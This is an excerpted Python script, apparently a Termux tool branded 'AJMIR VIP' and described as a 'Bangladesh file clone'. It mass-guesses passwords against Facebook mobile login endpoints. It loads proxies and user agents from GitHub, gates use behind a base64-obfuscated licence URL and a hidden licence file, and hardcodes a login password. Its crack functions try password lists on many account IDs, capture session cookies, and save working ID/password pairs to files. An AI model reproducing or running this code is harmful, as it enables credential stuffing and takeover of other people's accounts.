...
time.sleep(2)
os.system(f'xdg-open https://youtube.com/@DX_AJMIR_HOOSSAIN')
os.system(f'xdg-open https://facebook.com/groups/517746880494588/?ref=share')
...
prinCP=[]
try:
    prox= requests.get('https://github.com/DX-142/MBDC/blob/main/prox.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/DX-142/MBDC/blob/main/ajmir_ua.txt').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
    os.system('xdg-open https://facebook.com/groups/517746880494588/?ref=share_group_link')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
\033[1;91m╚═╝░░╚═╝░╚════╝░╚═╝░░░░░╚═╝╚═╝╚═╝░░╚═╝
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m CREATED BY \033[1;91m  :  \033[1;92mDX\033[1;91m-\033[1;92mAJMIR                   \033[1;91m|
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m FACEBOK\033[1;91m      : \033[1;92m DX\033[1;91m-\033[1;92mAjmir\033[1;91m-\033[1;92mHossain\033[1;91m-\033[1;92m          \033[1;91m|
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m GITHUB\033[1;91m       :  \033[1;92mDX-\033[1;91m-\033[1;92m142                    \033[1;91m|
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m TOOL STATUS\033[1;91m  : \033[1;92m BANGLADESH-FILE CLONE       \033[1;91m|
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m TOOLS\033[1;91m        \033[1;91m: \033[1;92m DX\033[1;91m-\033[1;92mPIAD                     \033[1;91m|
...
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m S.D.S Spmming Team 👨‍💻\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●    \033[1;91m[\033[1;92m√\033[1;91m]
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱""")
...
cm2=str(cmr)
#####KEY NAME ######
kx=cm2.replace("b","AJMIR")
####################
key=kx.upper()
##### APPROVE URL #####

url=base64.b64decode(b'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0RYLTE0Mi9BcHByb3ZhbC9tYWluL0pvc3MudHh0=')
...
def lisens():
    ...
    li=ky[5:15]
    try:
        open("/data/data/com.termux/files/usr/bin/.ajmir.txt","r").read()
        expired_ck()
    except:
        while True:
            os.system("clear")
            ...
            if xcx == li:
                open("/data/data/com.termux/files/usr/bin/.ajmir.txt","a").write("done")
                expired_ck()
                break 
            else:
                continue 
...
os.system('espeak -a 300 " Welcome,   to,  AJMIR,  V I P,  Tools"')
def back():
	login()
...
while attemps < 12345677901:
    ...
    if username == 'Ajmir+jerin' and password == 'i love you jerin':
...
def menu():
    ...
    if ASHIK in ['111']:
        ...
        os.system('xdg-open https://github.com/DX-142')
        os.system("python nono.py")
    elif ASHIK in ['3','03']:
        result()
    elif ASHIK in ['0']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[AJMIR-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mAJMIR-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                print('\x1b[38;5;50m===============================================')
                ...
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mAJMIR-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " AJMIR,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[AJMIR-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mAJMIR-CP\033[1;91m] {idf} • {pw}')
                print('\x1b[38;5;50m============================')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•AJMIR-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " AJMIR,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
